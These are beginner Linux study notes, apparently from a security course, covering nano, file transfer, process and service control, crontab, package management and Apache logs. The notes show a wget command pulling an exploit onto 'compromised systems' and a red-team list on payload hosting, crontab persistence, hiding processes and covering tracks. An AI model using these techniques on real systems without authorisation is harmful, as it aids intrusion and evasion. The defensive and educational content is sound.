Linux Fundamentals Part 3 - Notes

🔐 Why This Matters for Security

These tools are essential for penetration testing, forensics, and system administration. Here's the practical security stuff I need to remember:

📝 Text Editors (Nano)

Security Use: Quick config edits during exploits or to modify scripts

```bash
nano target.txt                    # Create/edit files
Ctrl+W                             # Search for flags or specific text
Ctrl+X                             # Exit (saves if modified)
```

Used this to search for flags in files during challenges

🌐 File Transfer Tools

Security Use: Moving tools to target machines or exfiltrating data

Python Server (For sharing files)

```bash
python3 -m http.server 8080        # Host files in current directory
```

Great for hosting payloads or tools during pentests

Wget (Download files)

```bash
wget http://192.168.1.100:8080/exploit.py   # Grab files from web servers
```

Perfect for downloading tools to compromised systems

⚙️ Process Management

Security Use: Finding hidden processes, maintaining access, investigating compromises
Finding Processes

```bash
ps aux                             # See ALL running processes
ps aux | grep suspicious           # Look for malicious processes
```
Found flags by searching through process lists

Killing Processes

```bash
kill 1337                          # Graceful kill (asks nicely)
kill -9 1337                       # Force kill (no questions)
```
Use -9 when normal kill doesn't work (stubborn malware)

Service Control
```bash
systemctl stop apache2             # Stop web server
systemctl start ssh                # Start SSH service
```
Important for stopping services during attacks or investigations

🤖 Automation (Crontab)
Security Use: Persistence, scheduled tasks, automation
```bash
crontab -e                         # Edit cron jobs (be careful!)
* * * * * /bin/bash script.sh      # Runs every minute
```
Attackers use this for persistence - check crontab during forensics!

📦 Package Management
Security Use: Installing security tools, updating systems
```bash
apt install nmap                   # Install security tools
apt update && apt upgrade          # Update system (patch vulnerabilities)
```
Always keep systems updated to prevent exploits

📊 Log Analysis
Security Use: Investigating attacks, finding intruders
Apache Logs Location

```bash
/var/log/apache2/access.log        # Who visited the site
/var/log/apache2/error.log         # What went wrong
```

What to Look For
· Suspicious IP addresses - attackers scanning your site
· Strange file accesses - someone looking for sensitive files
· Error patterns - failed login attempts or exploit attempts
Found attacker IPs by checking who accessed flag.txt

💡 Key Security Takeaways

For Attackers (Red Team):
· Use Python servers to transfer tools
· Hide processes to avoid detection
· Use crontab for persistence
· Check logs to cover tracks

For Defenders (Blue Team):
· Monitor running processes for malware
· Check crontab for suspicious jobs
· Analyze logs for attack patterns
· Keep systems updated

For Forensics:
· Process lists show what was running
· Logs reveal attack timeline
· Crontab shows persistence mechanisms

🎯 Real-World Applications
1. Incident Response: Use ps aux to find malicious processes
2. Penetration Testing: Use wget to download exploits
3. Forensics: Analyze logs to reconstruct attacks
4. System Hardening: Remove unnecessary services
